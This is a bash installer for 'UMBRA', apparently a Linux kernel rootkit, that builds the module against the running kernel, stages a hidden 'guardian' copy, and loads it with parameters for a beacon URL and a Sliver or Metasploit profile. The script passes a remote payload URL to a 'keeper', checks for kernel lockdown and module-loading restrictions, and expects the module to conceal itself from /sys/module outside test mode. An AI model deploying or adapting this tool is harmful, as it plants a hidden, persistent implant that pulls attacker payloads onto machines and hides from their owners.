#!/bin/bash
# UMBRA installer: preflight -> build -> stage -> load -> verify.
# Works on any 6.x/7.x kernel: the module is always compiled against the
# running kernel's headers, so there is no cross-kernel .ko to ship.
set -uo pipefail
cd "$(dirname "$0")" || exit 1

R='\033[0;31m'; G='\033[0;32m'; Y='\033[1;33m'; C='\033[0;36m'
B='\033[1;34m'; D='\033[0;90m'; W='\033[1;37m'; N='\033[0m'

CONFIG_DIR="/etc/umbra"
CONFIG="$CONFIG_DIR/config"
STAGED_KO="/lib/modules/umbra.ko"
MODULE="umbra"

ok()   { echo -e "  ${G}✓${N} $1"; }
warn() { echo -e "  ${Y}!${N} $1"; }
bad()  { echo -e "  ${R}✗${N} $1"; }
info() { echo -e "  ${B}›${N} $1"; }
sec()  { echo -e "\n${C}── $1 ${N}"; }

[[ $EUID -eq 0 ]] || { bad "run as root"; exit 1; }

MODE="${1:-install}"
case "$MODE" in
    install|--install)   MODE=install ;;
    test|--test)         MODE=test ;;
    uninstall|--uninstall) MODE=uninstall ;;
    status|--status)     MODE=status ;;
    reload|--reload)     MODE=reload ;;
    *) bad "unknown mode: $MODE"; echo "use: $0 [install|test|uninstall|status|reload]"; exit 1 ;;
esac

load_config() {
    [[ -f "$CONFIG" ]] && source "$CONFIG"
    BEACON_URL="${BEACON_URL:-}"
    BEACON_PROFILE="${BEACON_PROFILE:-sliver}"
    BEACON_ARGS="${BEACON_ARGS:-}"
    FETCHER="${FETCHER:-curl}"
    STAGE_DIR="${STAGE_DIR:-/tmp/.ub-state}"
    INTERVAL="${INTERVAL:-20}"
    TEST_MODE="${TEST_MODE:-0}"
}

save_config() {
    mkdir -p "$CONFIG_DIR"
    chmod 700 "$CONFIG_DIR"
    cat > "$CONFIG" <<EOF
BEACON_URL="$BEACON_URL"
BEACON_PROFILE="$BEACON_PROFILE"
BEACON_ARGS="$BEACON_ARGS"
FETCHER="$FETCHER"
STAGE_DIR="$STAGE_DIR"
INTERVAL="$INTERVAL"
TEST_MODE="$TEST_MODE"
EOF
    chmod 600 "$CONFIG"
    ok "config saved to $CONFIG"
}

preflight() {
    sec "PREFLIGHT"

    local virt
    virt="$(systemd-detect-virt 2>/dev/null || echo unknown)"
    case "$virt" in
        kvm|xen|vmware|oracle|qemu|amazon|azure|google)
            ok "virtualization: $virt (real kernel)" ;;
        none)
            ok "bare metal" ;;
        *)
            bad "virtualization: $virt — containers cannot load kernel modules"
            exit 1 ;;
    esac

    local disabled
    disabled="$(cat /proc/sys/kernel/modules_disabled 2>/dev/null || echo 1)"
    [[ "$disabled" == "0" ]] || { bad "module loading disabled (modules_disabled=$disabled)"; exit 1; }
    ok "module loading enabled"

    local lockdown
    lockdown="$(cat /sys/kernel/security/lockdown 2>/dev/null || echo '[none]')"
    if grep -q '\[none\]' <<<"$lockdown"; then
        ok "kernel lockdown: none"
    else
        bad "kernel lockdown active ($lockdown) — unsigned modules will be refused"
        exit 1
    fi

    local kver build
    kver="$(uname -r)"
    build="/lib/modules/$kver/build"
    if [[ ! -d "$build" ]]; then
        info "headers missing for $kver, installing..."
        if command -v apt-get &>/dev/null; then
            apt-get update -qq && apt-get install -y -qq "linux-headers-$kver" build-essential
        elif command -v dnf &>/dev/null; then
            dnf install -y "kernel-devel-$kver" gcc make
        elif command -v pacman &>/dev/null; then
            pacman -S --noconfirm linux-headers base-devel
        else
            bad "no supported package manager for headers"
            exit 1
        fi
    fi
    [[ -d "$build" ]] || { bad "headers still missing at $build"; exit 1; }
    ok "kernel $kver headers present"

    for t in make gcc; do
        command -v "$t" &>/dev/null || { bad "$t not found"; exit 1; }
    done
    ok "toolchain present"
}

configure() {
    sec "CONFIGURE"
    if [[ "$MODE" == "test" ]]; then
        TEST_MODE=1
        BEACON_URL="${BEACON_URL:-}"
        [[ -z "$BEACON_URL" ]] && BEACON_URL="http://127.0.0.1:8000/fake.elf"
        ok "test mode — no concealment, no guardian, verbose dmesg"
    elif [[ -f "$CONFIG" && "${1:-}" != "--reconfigure" ]]; then
        info "using saved configuration"
    else
        read -r -p "  Beacon URL (blank = keeper dormant): " BEACON_URL
        read -r -p "  Profile [sliver/metasploit/custom] ($BEACON_PROFILE): " ans
        BEACON_PROFILE="${ans:-$BEACON_PROFILE}"
        read -r -p "  Extra beacon args [$BEACON_ARGS]: " ans
        BEACON_ARGS="${ans:-$BEACON_ARGS}"
        read -r -p "  Poll interval seconds [$INTERVAL]: " ans
        INTERVAL="${ans:-$INTERVAL}"
        TEST_MODE=0
    fi
    save_config
}

build_module() {
    sec "BUILD"
    make clean &>/dev/null || true
    if ! make -j"$(nproc)" >/tmp/umbra-build.log 2>&1; then
        bad "build failed — last 25 lines:"
        tail -25 /tmp/umbra-build.log
        exit 1
    fi
    local w
    w="$(grep -ci 'warning:' /tmp/umbra-build.log || true)"
    ok "built ${MODULE}.ko ${D}($w warnings)${N}"
}

load_module() {
    sec "LOAD"
    if grep -q "^$MODULE " /proc/modules 2>/dev/null; then
        info "module already loaded, removing first"
        rmmod "$MODULE" 2>/dev/null || true
        sleep 1
    fi

    cp "$MODULE.ko" "$STAGED_KO"
    chmod 600 "$STAGED_KO"
    ok "staged at $STAGED_KO (guardian image)"

    local params="ub_test_mode=$TEST_MODE ub_beacon_interval=$INTERVAL ub_beacon_profile=$BEACON_PROFILE"
    params+=" ub_beacon_url=$BEACON_URL"
    [[ -n "$BEACON_ARGS" ]] && params+=" ub_beacon_args=$BEACON_ARGS"

    if ! insmod "$MODULE.ko" $params; then
        bad "insmod failed"
        dmesg | tail -15
        exit 1
    fi
    ok "module loaded"
    sleep 2
}

verify() {
    sec "VERIFY"
    if [[ -d "/sys/module/$MODULE" ]]; then
        ok "/sys/module/$MODULE present"
    else
        warn "module already concealed (expected outside test mode)"
    fi

    if [[ "$TEST_MODE" == "1" ]]; then
        info "module params:"
        for p in ub_test_mode ub_beacon_url ub_beacon_profile ub_beacon_interval; do
            local f="/sys/module/$MODULE/parameters/$p"
            [[ -f "$f" ]] && echo "      $p = $(cat "$f")"
        done
        info "recent UMBRA log:"
        dmesg | grep 'UMBRA' | tail -10 | sed 's/^/      /'
    else
        info "watch ${STAGE_DIR}/hb and dmesg for keeper activity"
    fi
    ok "done"
}

do_uninstall() {
    sec "UNINSTALL"
    load_config
    local pf
    for pf in "$STAGE_DIR"/.g* "$STAGE_DIR"/.p*; do
        [[ -f "$pf" ]] || continue
        local pid; pid="$(cat "$pf" 2>/dev/null)"
        [[ "$pid" =~ ^[0-9]+$ ]] && kill "$pid" 2>/dev/null && info "stopped pid $pid"
    done
    rmmod "$MODULE" 2>/dev/null && ok "module removed" || warn "rmmod failed (already gone?)"
    rm -f "$STAGED_KO"
    rm -rf "$CONFIG_DIR" "$STAGE_DIR"
    ok "staged image, config and state removed"
}

case "$MODE" in
    install|test)
        preflight
        configure "${2:-}"
        build_module
        load_module
        verify
        ;;
    reload)
        load_config
        rmmod "$MODULE" 2>/dev/null || true
        build_module
        load_module
        verify
        ;;
    uninstall) do_uninstall ;;
    status)
        load_config
        if grep -q "^$MODULE " /proc/modules 2>/dev/null; then ok "loaded"; else warn "not loaded"; fi
        echo "      url=$BEACON_URL profile=$BEACON_PROFILE test=$TEST_MODE"
        ;;
esac
